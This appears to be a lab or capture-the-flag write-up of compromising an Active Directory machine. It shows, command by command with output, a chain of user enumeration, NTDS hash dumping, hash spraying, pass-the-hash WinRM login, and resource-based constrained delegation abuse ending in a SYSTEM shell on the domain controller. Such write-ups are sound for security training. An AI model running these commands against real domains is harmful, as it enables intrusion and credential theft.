##### Tags: `AD`  `impacket-rbcd`  `impacket-getST`  `impacket-secretsdump`  `Powermad.ps1`  `Password Spraying`

# 🪟 Resourced (AD)🪟
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.197.175

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-16 11:04:09Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: RESOURCEDC; OS: Windows; CPE: cpe:/o:microsoft:windows
```
Active Directory Machine  
Windows 10  
domain name resourced.local
```console
$ crackmapexec smb 192.168.197.175 
SMB         192.168.197.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:False)
```
enum4linux found a list of user with a password HotelCalifornia194! for user V.Ventz
```console
$ enum4linux 192.168.197.175
 ======================================( Users on resourced.local )======================================
                                                                                                                  
index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0xf72 RID: 0x457 acb: 0x00020010 Account: D.Durant       Name: (null)    Desc: Linear Algebra and crypto god
index: 0xf73 RID: 0x458 acb: 0x00020010 Account: G.Goldberg     Name: (null)    Desc: Blockchain expert
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xf6d RID: 0x452 acb: 0x00020010 Account: J.Johnson      Name: (null)    Desc: Networking specialist
index: 0xf6b RID: 0x450 acb: 0x00020010 Account: K.Keen Name: (null)    Desc: Frontend Developer
index: 0xf10 RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0xf6c RID: 0x451 acb: 0x00000210 Account: L.Livingstone  Name: (null)    Desc: SysAdmin
index: 0xf6a RID: 0x44f acb: 0x00020010 Account: M.Mason        Name: (null)    Desc: Ex IT admin
index: 0xf70 RID: 0x455 acb: 0x00020010 Account: P.Parker       Name: (null)    Desc: Backend Developer
index: 0xf71 RID: 0x456 acb: 0x00020010 Account: R.Robinson     Name: (null)    Desc: Database Admin
index: 0xf6f RID: 0x454 acb: 0x00020010 Account: S.Swanson      Name: (null)    Desc: Military Vet now cybersecurity specialist
index: 0xf6e RID: 0x453 acb: 0x00000210 Account: V.Ventz        Name: (null)    Desc: New-hired, reminder: HotelCalifornia194!
```
smbclient found the user directory call Password Audit
```console
$ smbclient -L //192.168.197.175 -U 'V.Ventz'    
Password for [WORKGROUP\V.Ventz]: HotelCalifornia194!

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Password Audit  Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
```
```console
$ smbclient '//192.168.197.175/Password Audit' -U 'V.Ventz'
Password for [WORKGROUP\V.Ventz]: HotelCalifornia194!

smb: \> recurse
smb: \> ls
  .                                   D        0  Tue Oct  5 19:49:16 2021
  ..                                  D        0  Tue Oct  5 19:49:16 2021
  Active Directory                    D        0  Tue Oct  5 19:49:15 2021
  registry                            D        0  Tue Oct  5 19:49:16 2021

\Active Directory
  .                                   D        0  Tue Oct  5 19:49:16 2021
  ..                                  D        0  Tue Oct  5 19:49:16 2021
  ntds.dit                            A 25165824  Mon Sep 27 21:30:54 2021
  ntds.jfm                            A    16384  Mon Sep 27 21:30:54 2021

\registry
  .                                   D        0  Tue Oct  5 19:49:16 2021
  ..                                  D        0  Tue Oct  5 19:49:16 2021
  SECURITY                            A    65536  Mon Sep 27 20:45:20 2021
  SYSTEM                              A 16777216  Mon Sep 27 20:45:20 2021
```
download all 4 files and use impacket-secretsdump dump the hashes  
found a list of hashes from ntds.dit file
```console
$ impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x6f961da31c7ffaf16683f78e04c3e03d
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 9298735ba0d788c4fc05528650553f94
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
RESOURCEDC$:1000:aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3004b16f88664fbebfcb9ed272b0565b:::
M.Mason:1103:aad3b435b51404eeaad3b435b51404ee:3105e0f6af52aba8e11d19f27e487e45:::
K.Keen:1104:aad3b435b51404eeaad3b435b51404ee:204410cc5a7147cd52a04ddae6754b0c:::
L.Livingstone:1105:aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808:::
J.Johnson:1106:aad3b435b51404eeaad3b435b51404ee:3e028552b946cc4f282b72879f63b726:::
V.Ventz:1107:aad3b435b51404eeaad3b435b51404ee:913c144caea1c0a936fd1ccb46929d3c:::
S.Swanson:1108:aad3b435b51404eeaad3b435b51404ee:bd7c11a9021d2708eda561984f3c8939:::
P.Parker:1109:aad3b435b51404eeaad3b435b51404ee:980910b8fc2e4fe9d482123301dd19fe:::
R.Robinson:1110:aad3b435b51404eeaad3b435b51404ee:fea5a148c14cf51590456b2102b29fac:::
D.Durant:1111:aad3b435b51404eeaad3b435b51404ee:08aca8ed17a9eec9fac4acdcb4652c35:::
G.Goldberg:1112:aad3b435b51404eeaad3b435b51404ee:62e16d17c3015c47b4d513e65ca757a2:::
```
found user L.Livingstone and login via winrm using the hash  
put all hashes in a file and password spraying all hashes to the user list
```console
$ crackmapexec winrm 192.168.197.175 -u user.txt -p hash.txt --continue-on-success
WINRM       192.168.197.175 5985   RESOURCEDC       [+] resourced.local\L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808 (Pwn3d!)
```
login in via winrm
```console
$ evil-winrm -i 192.168.197.175 -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808
                                        
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> whoami
resourced\l.livingstone
```
## Privilege Escalation
upload sharphound and upload to bloodhound to see what our user can do in this active directory
```console
*Evil-WinRM* PS C:\Users\L.Livingstone\Desktop> ./SharpHound.exe
-a----        4/16/2026   5:33 AM          11677 20260416053328_BloodHound.zip
```
in bloodhound we found user L.Livingstone has GenericAll to domain controller RESOURCEDC.RESOURCED.LOCAL
```console
The GenericAll grants L.LIVINGSTONE@RESOURCED.LOCAL the permission to write to the "msds-KeyCredentialLink" attribute of RESOURCEDC.RESOURCED.LOCAL. Writing to this property allows an attacker to create "Shadow Credentials" on the object and authenticate as the principal using kerberos PKINIT.
```
follow the step  
uplaod the Kevin Robertson's Powermad  
https://github.com/kevin-robertson/powermad
```console
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> import-module .\Powermad.ps1
```
create a new machine account
```console
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
[+] Machine account attackersystem added
```
found the domain name of DC
```console
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> net group "Domain Controllers" /domain
Group name     Domain Controllers
Comment        All domain controllers in the domain

Members

-------------------------------------------------------------------------------
RESOURCEDC$
The command completed successfully.
```
adjust the machine right to impersonate users
```console
$ impacket-rbcd -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'RESOURCEDC$' -action 'write' 'resourced.local'/'L.Livingstone' -hashes ':19a3a7550ce8c505c2d46b5e39d6f808' -dc-ip 192.168.197.175
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] ATTACKERSYSTEM$ can now impersonate users on RESOURCEDC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     attackersystem$   (S-1-5-21-537427935-490066102-1511301751-4101)
```
generate a fake administrator ticket
```console
$ impacket-getST -spn 'cifs/ResourceDC.resourced.local' -impersonate 'administrator' 'resourced.local/attackersystem$:Summer2018!' -dc-ip 192.168.197.175
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_ResourceDC.resourced.local@RESOURCED.LOCAL.ccache
```
export the ticket for use and add the domain to the victim ip
```console
$ export KRB5CCNAME=./administrator@cifs_ResourceDC.resourced.local@RESOURCED.LOCAL.ccache

192.168.197.175 resourced.local resourcedc.resourced.local
```
login as administrator using the fake ticket via psexec
```console
$ impacket-psexec resourced.local/administrator@ResourceDC.resourced.local -k -no-pass
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on ResourceDC.resourced.local.....
[*] Found writable share ADMIN$
[*] Uploading file hTOYytXj.exe
[*] Opening SVCManager on ResourceDC.resourced.local.....
[*] Creating service zXXB on ResourceDC.resourced.local.....
[*] Starting service zXXB.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2145]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
